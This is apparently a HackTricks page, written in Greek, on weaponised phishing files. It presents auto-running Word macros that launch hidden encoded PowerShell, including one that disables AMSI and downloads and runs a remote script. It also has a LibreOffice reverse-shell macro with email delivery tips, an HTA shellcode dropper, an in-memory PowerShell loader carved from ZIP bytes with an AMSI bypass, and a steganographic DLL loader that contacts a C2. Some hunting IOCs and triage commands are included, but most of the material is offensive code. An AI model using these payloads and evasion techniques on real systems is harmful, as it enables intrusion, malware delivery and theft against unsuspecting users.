# Αρχεία και έγγραφα phishing

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word επικυρώνει τα δεδομένα του αρχείου πριν το ανοίξει. Η επικύρωση των δεδομένων γίνεται με τη μορφή αναγνώρισης της δομής δεδομένων, βάσει του προτύπου OfficeOpenXML. Αν προκύψει σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν μακροεντολές χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την επέκτασή του, διατηρώντας παράλληλα τη δυνατότητα εκτέλεσης των μακροεντολών του.\
Για παράδειγμα, τα αρχεία RTF δεν υποστηρίζουν μακροεντολές από σχεδιασμό, αλλά ένα αρχείο DOCM που έχει μετονομαστεί σε RTF θα τύχει επεξεργασίας από το Microsoft Word και θα μπορεί να εκτελέσει μακροεντολές.\
Τα ίδια εσωτερικά στοιχεία και οι ίδιοι μηχανισμοί ισχύουν για όλο το λογισμικό της σουίτας Microsoft Office (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελεστούν από ορισμένα προγράμματα Office:

```bash
assoc | findstr /i "word excel powerp"
```

Τα αρχεία DOCX που αναφέρονται σε ένα απομακρυσμένο πρότυπο (File –Options –Add-ins –Manage: Templates –Go) το οποίο περιλαμβάνει macros μπορούν επίσης να «εκτελέσουν» macros.

### Φόρτωση εξωτερικής εικόνας

Μεταβείτε στο: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture και **Filename or URL**:_ http://<ip>/whatever

![Έγγραφα Office - Φόρτωση εξωτερικής εικόνας: Μεταβείτε στο: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Για την ανάλυση ενός εγγράφου που λάβατε, αντί για τη δημιουργία ενός, δείτε την [ανάλυση VBA macro: άχρηστος κώδικας και UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Κερκόπορτα μέσω Macros

Μπορείτε να χρησιμοποιήσετε macros για να εκτελέσετε αυθαίρετο κώδικα από το έγγραφο.

#### Λειτουργίες αυτόματης φόρτωσης

Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό είναι να τις εντοπίσει το AV.

- AutoOpen()
- Document_Open()

#### Παραδείγματα κώδικα Macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Μη αυτόματη αφαίρεση μεταδεδομένων

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, για να ανοίξει ο Επιθεωρητής εγγράφων. Κάντε κλικ στο **Inspect** και, στη συνέχεια, στο **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Επέκταση εγγράφου

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type** και αλλάξτε τη μορφή από **`.docx`** σε Word 97-2003 **`.doc`**.\
Κάντε το αυτό επειδή **δεν μπορείτε να αποθηκεύσετε macro μέσα σε ένα `.docx`** και υπάρχει **αρνητική εντύπωση** **για** την επέκταση **`.docm`**, η οποία υποστηρίζει macro (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες web/email τα αποκλείουν εντελώς). Επομένως, η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Generators κακόβουλων Macro

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αυτόματη εκτέλεση macro LibreOffice ODT (Basic)

Τα έγγραφα του LibreOffice Writer μπορούν να ενσωματώνουν macro Basic και να τα εκτελούν αυτόματα όταν ανοίγει το αρχείο, συνδέοντας το macro με το συμβάν **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ένα απλό macro reverse shell μοιάζει ως εξής:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Σημειώστε τα διπλά εισαγωγικά (`""`) μέσα στη συμβολοσειρά – το LibreOffice Basic χρησιμοποιεί διπλά εισαγωγικά για να διαφύγει τα κυριολεκτικά εισαγωγικά, επομένως τα payloads που τελειώνουν σε `...==""")` διατηρούν ισορροπημένα τόσο την εσωτερική εντολή όσο και το όρισμα του Shell.

Συμβουλές παράδοσης:

- Αποθηκεύστε το αρχείο ως `.odt` και συνδέστε τη macro με το συμβάν του εγγράφου, ώστε να εκτελείται αμέσως μόλις αυτό ανοιχτεί.
- Όταν στέλνετε email με το `swaks`, χρησιμοποιήστε `--attach @resume.odt` (το `@` απαιτείται, ώστε να σταλούν ως συνημμένο τα bytes του αρχείου και όχι η συμβολοσειρά του ονόματος αρχείου). Αυτό είναι κρίσιμο όταν γίνεται κατάχρηση SMTP servers που δέχονται αυθαίρετους παραλήπτες `RCPT TO` χωρίς επικύρωση.

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και γλώσσες scripting (όπως VBScript και JScript)**. Δημιουργεί το περιβάλλον χρήστη και εκτελείται ως εφαρμογή «πλήρους εμπιστοσύνης», χωρίς τους περιορισμούς του μοντέλου ασφάλειας ενός browser.

Ένα HTA εκτελείται με χρήση του **`mshta.exe`**, το οποίο συνήθως **εγκαθίσταται** μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτημένο από τον IE**. Επομένως, αν ο IE έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Ψεύτικες κάρτες συνημμένων σε email HTML

Ένα email HTML μπορεί να μιμηθεί την εγγενή κάρτα προεπισκόπησης συνημμένου ενός παρόχου, αντί να περιλαμβάνει πραγματικό συνημμένο. Η Talos παρατήρησε μια κάρτα Gmail αναδημιουργημένη από τέσσερα inline PNG MIME parts κωδικοποιημένα σε Base64. Όλο το οπτικό στοιχείο ήταν περικλεισμένο σε ένα anchor, ενώ μια τιμή παραλήπτη στο `?m=<target-id>` επέτρεπε την παρακολούθηση ανά παραλήπτη. Ο σύνδεσμος ξεκινούσε με `//` αντί για `http://` ή `https://`. Τα προγράμματα περιήγησης επιλύουν αυτή τη μορφή protocol-relative, αλλά οι εξαγωγείς URL που εντοπίζουν μόνο πλήρως προσδιορισμένα URL μπορεί να μην τον εντοπίσουν.<sup>[[11]](#references)</sup>

Κατά την ανάλυση, εξετάστε το raw MIME αντί να εμπιστεύεστε τη λίστα συνημμένων όπως εμφανίζεται. Ανακατασκευάστε τον τρόπο με τον οποίο τα inline image parts σχηματίζουν την οπτική κάρτα, εντοπίστε το anchor που τα περικλείει και κανονικοποιήστε τις τιμές `href` σε μορφή protocol-relative πριν εξαγάγετε URL.<sup>[[11]](#references)</sup>

Για δοκιμές πλαστογράφησης αποστολέα envelope/header και ευθυγράμμισης DMARC, δείτε το [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Εξαναγκασμός αυθεντικοποίησης NTLM

Υπάρχουν αρκετοί τρόποι να **εξαναγκάσετε απομακρυσμένα την αυθεντικοποίηση NTLM**. Για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε email ή HTML στα οποία θα αποκτήσει πρόσβαση ο χρήστης (ακόμη και μέσω HTTP MitM;). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **ενεργοποιήσουν** μια **αυθεντικοποίηση** μόνο και μόνο με το **άνοιγμα του φακέλου**.

**Ελέγξτε αυτές τις ιδέες και άλλες στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή τα στοιχεία αυθεντικοποίησης, αλλά και να **εκτελέσετε επιθέσεις NTLM relay**:

- [**Επιθέσεις NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay σε certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK για εκτέλεση τοπικών εντολών μέσω `ftp.exe`

Μια συντόμευση μπορεί να εκκινήσει το `ftp.exe -s:icon.ico`, χρησιμοποιώντας ένα αρχείο εντολών κειμένου που μεταμφιέζεται με επέκταση εικόνας.<sup>[[12]](#references)</sup> Η επιλογή `-s:` διαβάζει τοπικές εντολές FTP. Στα Windows 8 και νεότερα, το αρχείο πρέπει να είναι κωδικοποιημένο σε UTF-8.<sup>[[13]](#references)</sup> Μια γραμμή που αρχίζει με `!` εκτελεί μια τοπική εντολή μέσω `cmd /c`, χωρίς να στείλει αυτή την εντολή σε FTP server. Δεν απαιτείται σύνδεση FTP για αυτή την τοπική διαδρομή εκτέλεσης.<sup>[[14]](#references)</sup> Στην αλυσίδα που αναφέρθηκε, το FTP script έφτανε σε ένα δεύτερο αρχείο εντολών. Σημασία έχει ολόκληρη η γραμμή `!`: το `!more res.ico` από μόνο του εμφανίζει το αρχείο, ενώ η διοχέτευση μέσω pipe σε `cmd` εκτελεί τα περιεχόμενά του.<sup>[[12]](#references)[[14]](#references)</sup>

Η ίδια αλυσίδα χρησιμοποιούσε μια επαναλαμβανόμενη εργασία για να ξαναδιαβάζει ένα εγγράψιμο αρχείο εντολών, αντί να εγκαθιστά νέο εκτελέσιμο σε κάθε ενημέρωση. Η ενέργεια της εργασίας ήταν `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`. Το αρχείο περιείχε μια εντολή που ανακτούσε οδηγίες κατά την εκτέλεσή της. Μια σχετική παραλλαγή κατέβαζε ένα νέο αρχείο εντολών πριν από την προγραμματισμένη εκτέλεση. Το αρχείο πρέπει να υπάρχει και να είναι αναγνώσιμο όταν ενεργοποιείται η εργασία. Το `conhost` δεν αυξάνει τα δικαιώματα της εργασίας πέρα από το ρυθμισμένο user token.<sup>[[12]](#references)</sup> Δείτε το [scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md) για τους μηχανισμούς των εργασιών.

## Συντόμευση VHDX με κρυφό MSI και παραπλανητικό έγγραφο

Ένα προσαρτημένο VHDX μπορεί να εμφανίζει ένα ορατό LNK, ενώ κρατά ένα MSI και ένα παραπλανητικό υπολογιστικό φύλλο κρυμμένα στον ίδιο τόμο. Στην αλυσίδα που αναφέρθηκε, το LNK χρησιμοποιούσε το `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Ο διαχωριστής `&` ανοίγει το παραπλανητικό αρχείο ακόμη και αν αποτύχει η εντολή του installer. Το άνοιγμα του εγγράφου δεν αποδεικνύει ότι η εγκατάσταση ολοκληρώθηκε επιτυχώς. Πρόκειται για παραλλαγή παράδοσης του [MSI custom-action execution](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), όχι για κλιμάκωση προνομίων μέσω MSI από μόνο του.<sup>[[12]](#references)</sup>

Για αυτό το MSI, το `CustomAction.Type` **194** συνδυάζει ένα EXE αποθηκευμένο στον πίνακα `Binary` (**2**) με τις σημαίες ignore-return-code (**64**) και asynchronous (**128**). Ο συνδυασμός **64 + 128** σημαίνει ότι το Windows Installer δεν περιμένει να ολοκληρωθεί το EXE. Μόνο η σημαία 128 θα προκαλούσε αναμονή μέχρι το τέλος της ακολουθίας.<sup>[[15]](#references)[[16]](#references)</sup> Ελέγξτε το `Source` της ενέργειας σε σχέση με τον πίνακα `Binary` και τη θέση της στο `InstallExecuteSequence` πριν αποδώσετε την εκτέλεση σε εκείνο το ενσωματωμένο EXE.<sup>[[12]](#references)[[15]](#references)</sup> Μια [διαδρομή WebDAV UNC μπορεί να παραδώσει απομακρυσμένο MSI](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), αλλά πρόκειται για διαφορετικό σημείο εισόδου.

## LNK Loaders + Payloads ενσωματωμένα σε ZIP (fileless αλυσίδα)

Ιδιαίτερα αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα παραπλανητικά έγγραφα (PDF/DOCX) και ένα κακόβουλο .lnk. Το τέχνασμα είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP, μετά από έναν μοναδικό marker, και το .lnk τον απομονώνει και τον εκτελεί εξ ολοκλήρου στη μνήμη.<sup>[[2]](#references)</sup>

Τυπική ροή που υλοποιεί το PowerShell one-liner του .lnk:

1) Εντοπίζει το αρχικό ZIP σε συνήθεις διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData% και στον γονικό φάκελο του τρέχοντος working directory.
2) Διαβάζει τα bytes του ZIP και εντοπίζει έναν hardcoded marker (π.χ. xFIQCV). Ό,τι ακολουθεί μετά τον marker είναι το ενσωματωμένο PowerShell payload.
3) Αντιγράφει το ZIP στο %ProgramData%, το αποσυμπιέζει εκεί και ανοίγει το παραπλανητικό .docx για να φαίνεται νόμιμο.
4) Παρακάμπτει το AMSI για την τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Αποκωδικοποιεί το επόμενο stage (π.χ. αφαιρεί όλους τους χαρακτήρες #) και το εκτελεί στη μνήμη.

Παράδειγμα σκελετού PowerShell για την απομόνωση και εκτέλεση του ενσωματωμένου stage:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστα subdomains PaaS (π.χ., *.herokuapp.com) και μπορεί να περιορίζει την πρόσβαση στα payloads (να παρέχει αβλαβή ZIP βάσει IP/UA).
- Το επόμενο στάδιο αποκρυπτογραφεί συχνά shellcode σε base64/XOR και το εκτελεί μέσω Reflection.Emit + VirtualAlloc, ώστε να ελαχιστοποιήσει τα αρχεία που αφήνει στον δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του Microsoft Web Browser control, ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή το ενσωματώνει να επανεκκινεί αυτόματα το payload.<sup>[[2]](#references)[[4]](#references)</sup> Δείτε λεπτομέρειες και έτοιμες προς χρήση εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Αναζήτηση/IOCs
- Αρχεία ZIP που περιέχουν τη συμβολοσειρά δείκτη ASCII (π.χ., xFIQCV) προσαρτημένη στα δεδομένα του αρχείου.
- Αρχείο .lnk που απαριθμεί γονικούς φακέλους/φακέλους χρήστη για να εντοπίσει το ZIP και να ανοίξει ένα έγγραφο-δόλωμα.
- Παραποίηση του AMSI μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροσκελή επιχειρησιακά νήματα email που καταλήγουν σε συνδέσμους σε αξιόπιστους τομείς PaaS.

## Στάδιο προετοιμασίας με πρώτο το δόλωμα LNK → persistence μέσω προγραμματισμένης εργασίας → trusted CPL side-loading

Ένα άλλο επαναλαμβανόμενο μοτίβο είναι ένα **`.lnk` που προσποιείται ότι είναι έγγραφο**, ανοίγει αμέσως ένα αβλαβές δόλωμα, ενώ προετοιμάζει την πραγματική αλυσίδα στο παρασκήνιο.<sup>[[3]](#references)</sup>

Παρατηρημένη ροή εργασιών:
1. Η συντόμευση **μεταμφιέζεται σε PDF** και χρησιμοποιεί το `conhost.exe` ή έναν παρόμοιο proxy για να εκκινήσει ένα obfuscated PowerShell downloader.
2. Το PowerShell διασπά προφανή tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), ώστε να μην εντοπίζει την εντολή μια αφελής ανίχνευση που αναζητά `iwr`, `gci`, `ren`, `cpi` ή `schtasks`.
3. Το stager κατεβάζει **πρώτα το έγγραφο-δόλωμα**, το ανοίγει για το θύμα και έπειτα ανασυνθέτει τα κακόβουλα αρχεία στο παρασκήνιο.
4. Τα payloads μπορεί να αποθηκεύονται με **παραπλανητικές επεκτάσεις** και έπειτα να μετονομάζονται με αφαίρεση χαρακτήρων πλήρωσης, καθυστερώντας την εμφάνιση προφανών αρχείων `.exe` / `.cpl`.
5. Η persistence επιτυγχάνεται με μια **προγραμματισμένη εργασία που εκτελείται κάθε λεπτό** και εκκινεί ένα έμπιστο host binary από διαδρομή εγγράψιμη από τον χρήστη.

Ελάχιστες ενδείξεις για αναζήτηση βάσει αυτού του μοτίβου:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Μια χρήσιμη διάταξη staging που αξίζει να αναγνωρίζετε είναι:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Γιατί το δεύτερο στάδιο είναι stealthy

Στη μελέτη περίπτωσης της Rapid7, η scheduled task εκκινούσε επανειλημμένα το **`Fondue.exe`** από το `C:\Users\Public\`. Επειδή το **`APPWIZ.cpl`** είχε τοποθετηθεί δίπλα του και έκανε export το **`RunFODW`**, το έμπιστο binary της Microsoft έκανε side-load το CPL του attacker αντί για το νόμιμο αντίγραφο του συστήματος.

Στη συνέχεια, το CPL:
- Διαβάζει ένα blob **AES-256-CBC** από το `C:\Windows\Tasks\editor.dat`
- Το αποκρυπτογραφεί μέσω του **Windows CNG / `bcrypt.dll`**
- Δεσμεύει εκτελέσιμη μνήμη και αντιγράφει εκεί το αποκρυπτογραφημένο shellcode
- Το εκτελεί έμμεσα, περνώντας τον δείκτη του shellcode ως callback στο **`EnumUILanguagesW`**

Αυτό το τελευταίο βήμα αξίζει να διερευνηθεί ξεχωριστά: το malware συχνά αποφεύγει ένα άμεσο άλμα `((void(*)())buf)()` και αντ’ αυτού καταχράται ένα **νόμιμο WinAPI που δέχεται callback** για να μεταφέρει την εκτέλεση.

Το αποκρυπτογραφημένο payload σε αυτή την καμπάνια ήταν shellcode **Donut**, το οποίο στη συνέχεια χαρτογράφησε το τελικό PE εξ ολοκλήρου στη μνήμη και έκανε patch τα **AMSI/WLDP/ETW** στην τρέχουσα διεργασία πριν παραδώσει την εκτέλεση. Για περισσότερες σημειώσεις σχετικά με το side-loading και την επεξεργασία μετά την εκτέλεση στη μνήμη, δείτε:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Πρακτικά σημεία διερεύνησης:
- `.lnk` που εκκινούν `powershell.exe` ή `conhost.exe` και στη συνέχεια εμφανίζουν ένα παραπλανητικό έγγραφο.
- Λήψεις μικρής διάρκειας στο **`C:\Users\Public\`**, ακολουθούμενες από άμεση μετονομασία αρχείων με ακατανόητες επεκτάσεις.
- Scheduled tasks με κοινότοπα ονόματα όπως `GoogleErrorReport`, που εκτελούν αρχεία από **εγγράψιμους από τον χρήστη καταλόγους**.
- Έμπιστα binaries που φορτώνουν αρχεία **`.cpl` / `.dll`** από τον ίδιο κατάλογο εκτός συστήματος.
- Base64 blobs κειμένου που εγγράφονται στο **`C:\Windows\Tasks\`** και στη συνέχεια διαβάζονται από το module που έγινε side-load.

## Payloads με delimiters στεγανογραφίας σε εικόνες (PowerShell stager)

Πρόσφατες αλυσίδες loader διανέμουν ένα obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί ένα Base64 PowerShell stager. Αυτό το stager κατεβάζει μια εικόνα (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL, κρυμμένο ως απλό κείμενο ανάμεσα σε μοναδικούς δείκτες αρχής/τέλους. Το script αναζητά αυτούς τους delimiters (παραδείγματα που έχουν εντοπιστεί στην πράξη: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το κείμενο ανάμεσά τους, το αποκωδικοποιεί από Base64 σε bytes, φορτώνει το assembly στη μνήμη και καλεί μια γνωστή μέθοδο εισόδου με το URL του C2.<sup>[[5]](#references)</sup>

Ροή εργασίας
- Στάδιο 1: Αρχειοθετημένο JS/VBS dropper → αποκωδικοποιεί ενσωματωμένο Base64 → εκκινεί PowerShell stager με -nop -w hidden -ep bypass.
- Στάδιο 2: PowerShell stager → κατεβάζει εικόνα, εξάγει το Base64 που ορίζεται από τους δείκτες, φορτώνει το .NET DLL στη μνήμη και καλεί τη μέθοδό του (π.χ. VAI), περνώντας το URL του C2 και τις επιλογές.
- Στάδιο 3: Ο loader ανακτά το τελικό payload και συνήθως το εισάγει μέσω process hollowing σε ένα έμπιστο binary (συνήθως το MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Δείτε περισσότερα για το process hollowing και την εκτέλεση μέσω έμπιστων βοηθητικών προγραμμάτων εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Παράδειγμα PowerShell για εξαγωγή ενός DLL από εικόνα και κλήση μιας .NET μεθόδου στη μνήμη:

<details>
<summary>PowerShell extractor και loader για stego payload</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Σημειώσεις
- Πρόκειται για το ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Οι δείκτες διαφέρουν μεταξύ των campaigns.
- Τα AMSI/ETW bypass και η αποσυσκότιση συμβολοσειρών εφαρμόζονται συνήθως πριν από τη φόρτωση του assembly.
- Ανίχνευση: σάρωση εικόνων που έχουν ληφθεί για γνωστούς delimiters· εντοπισμός του PowerShell που αποκτά πρόσβαση σε εικόνες και αποκωδικοποιεί αμέσως blobs Base64.

Δείτε επίσης τα εργαλεία stego και τις τεχνικές carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → προετοιμασία σταδίου PowerShell μέσω Base64

Ένα συνηθισμένο αρχικό στάδιο είναι ένα μικρό, έντονα obfuscated αρχείο `.js` ή `.vbs`, το οποίο παραδίδεται μέσα σε ένα archive. Μοναδικός σκοπός του είναι να αποκωδικοποιήσει μια ενσωματωμένη συμβολοσειρά Base64 και να εκκινήσει το PowerShell με `-nop -w hidden -ep bypass`, ώστε να προετοιμάσει το επόμενο στάδιο μέσω HTTPS.<sup>[[5]](#references)</sup>

Σκελετός λογικής (αφηρημένα):
- Ανάγνωση του περιεχομένου του ίδιου του αρχείου
- Εντοπισμός ενός blob Base64 ανάμεσα σε άχρηστες συμβολοσειρές
- Αποκωδικοποίηση σε ASCII PowerShell
- Εκτέλεση μέσω `wscript.exe`/`cscript.exe` που καλεί το `powershell.exe`

Ενδείξεις για ανίχνευση
- Συνημμένα JS/VBS μέσα σε archive που εκκινούν το `powershell.exe` με `-enc`/`FromBase64String` στη γραμμή εντολών.
- Το `wscript.exe` εκκινεί το `powershell.exe -nop -w hidden` από προσωρινές διαδρομές χρήστη.

## Έγγραφα MSC ως containers εκτέλεσης (GrimResource)

Τα αρχεία Microsoft Management Console (`.msc`) είναι ορισμοί κονσόλας XML που συνήθως ανοίγουν με το `mmc.exe`. Το **GrimResource** οπλοποιεί μια αναφορά `StringTable` σε έναν πόρο `apds.dll` που περιέχει ένα παλιό XSS primitive, ώστε όταν ένας χρήστης ανοίξει την ειδικά κατασκευασμένη κονσόλα, να εκτελεστεί JavaScript μέσα στο `mmc.exe`. Τα δείγματα που παρατηρήθηκαν συνδύαζαν obfuscation βασισμένο στο `transformNode` με το **DotNetToJScript**, για να δημιουργήσουν ένα payload .NET χωρίς τη συνηθισμένη διαδρομή των Office macro.<sup>[[9]](#references)</sup>

Για στατική αρχική διαλογή, αντιμετωπίστε ένα μη έμπιστο MSC ως κείμενο και **μην** κάνετε διπλό κλικ σε αυτό:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

